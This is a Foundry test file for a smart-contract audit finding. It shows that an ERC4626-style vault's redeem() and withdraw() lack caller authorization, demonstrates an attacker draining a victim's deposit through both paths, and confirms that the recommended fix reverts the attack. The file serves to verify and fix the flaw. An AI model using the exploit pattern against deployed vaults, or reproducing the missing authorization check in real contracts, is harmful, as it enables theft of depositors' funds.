// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    PearVault,
    PearVaultFixed,
    MiniToken,
    ERC4626Base
} from "./65286-c-01-missing-authorization-in-withdraw-and-redeem-allows-the.sol";

// Pear Vault 65286-C-01: Missing authorization in redeem()/withdraw().
// _withdrawWithFee forwards the share-owner as BOTH `caller` and `owner` to the
// base ERC4626 _withdraw(), which only enforces the allowance check when
// caller != owner. Any caller can therefore redeem a victim's shares to
// themselves. This test proves the theft, then proves the finding's recommended
// fix (authorize the caller) reverts the same attack.
contract PearVaultMissingAuthTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x0000000000000000000000000000000000000B0b;

    uint256 internal constant DEPOSIT = 1000 ether;

    // ── Exploit: attacker steals the victim's full deposit via redeem() ──
    function test_exploit_redeem_stealsVictimShares() public {
        Exploit e = new Exploit();
        e.run();

        MiniToken asset = MiniToken(e.assetAddr());
        PearVault vault = PearVault(e.vaultAddr());

        // Victim staked 1000e18 (1:1 first deposit) ...
        assertEq(e.victimSharesBefore(), DEPOSIT, "victim had a full stake before the attack");

        // ... the attacker, who never held those shares, received the underlying ...
        assertEq(e.attackerAssetAfter(), DEPOSIT, "attacker received the stolen underlying asset");
        assertEq(asset.balanceOf(ATTACKER), DEPOSIT, "stolen asset sits at the attacker EOA");

        // ... and the victim's shares were burned to zero.
        assertEq(e.victimSharesAfter(), 0, "victim's shares were burned");
        assertEq(vault.balanceOf(VICTIM), 0, "victim holds no shares after the theft");

        // The vault is drained of the underlying it custodied for the victim.
        assertEq(asset.balanceOf(e.vaultAddr()), 0, "vault drained of the victim's underlying");
    }

    // ── Direct proof of the withdraw() path (second vulnerable entry point) ──
    function test_exploit_withdraw_stealsVictimShares() public {
        MiniToken asset = new MiniToken("Stolen Asset", "STOLEN-ASSET");
        PearVault vault = new PearVault(asset);

        // Victim deposits (pranked as the victim so shares/assets are truly theirs).
        asset.mint(VICTIM, DEPOSIT);
        vm.startPrank(VICTIM);
        asset.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT, VICTIM);
        vm.stopPrank();
        assertEq(vault.balanceOf(VICTIM), DEPOSIT, "victim staked");

        // Attacker (this contract) withdraws the victim's assets to the attacker EOA.
        vm.prank(ATTACKER);
        // Note: caller is ATTACKER, but the vulnerable path still succeeds because
        // _withdrawWithFee passes `owner`(=VICTIM) as the base `caller`.
        vault.withdraw(DEPOSIT, ATTACKER, VICTIM);

        assertEq(asset.balanceOf(ATTACKER), DEPOSIT, "attacker drained the victim via withdraw()");
        assertEq(vault.balanceOf(VICTIM), 0, "victim's shares burned via withdraw()");
    }

    // ── Negative control: the recommended fix reverts the same attacker call ──
    function test_control_fixed_redeem_revertsUnauthorized() public {
        MiniToken asset = new MiniToken("Stolen Asset", "STOLEN-ASSET");
        PearVaultFixed vault = new PearVaultFixed(asset);

        // Victim deposits truthfully.
        asset.mint(VICTIM, DEPOSIT);
        vm.startPrank(VICTIM);
        asset.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT, VICTIM);
        vm.stopPrank();
        assertEq(vault.balanceOf(VICTIM), DEPOSIT, "victim staked");

        // The attacker call that stole funds against the buggy vault now reverts:
        // msg.sender != user and the attacker holds no allowance.
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("ERC20: insufficient allowance"));
        vault.redeem(DEPOSIT, ATTACKER, VICTIM);

        // Victim keeps their shares; attacker got nothing.
        assertEq(vault.balanceOf(VICTIM), DEPOSIT, "victim's shares intact under the fix");
        assertEq(asset.balanceOf(ATTACKER), 0, "attacker received nothing under the fix");
    }

    // ── Control: the legitimate owner CAN still redeem under the fix ──
    function test_control_fixed_owner_canRedeem() public {
        MiniToken asset = new MiniToken("Stolen Asset", "STOLEN-ASSET");
        PearVaultFixed vault = new PearVaultFixed(asset);

        asset.mint(VICTIM, DEPOSIT);
        vm.startPrank(VICTIM);
        asset.approve(address(vault), DEPOSIT);
        vault.deposit(DEPOSIT, VICTIM);
        // Owner redeems to themselves — msg.sender == user, no allowance needed.
        vault.redeem(DEPOSIT, VICTIM, VICTIM);
        vm.stopPrank();

        assertEq(asset.balanceOf(VICTIM), DEPOSIT, "owner recovered their own assets under the fix");
        assertEq(vault.balanceOf(VICTIM), 0, "owner's shares redeemed");
    }
}
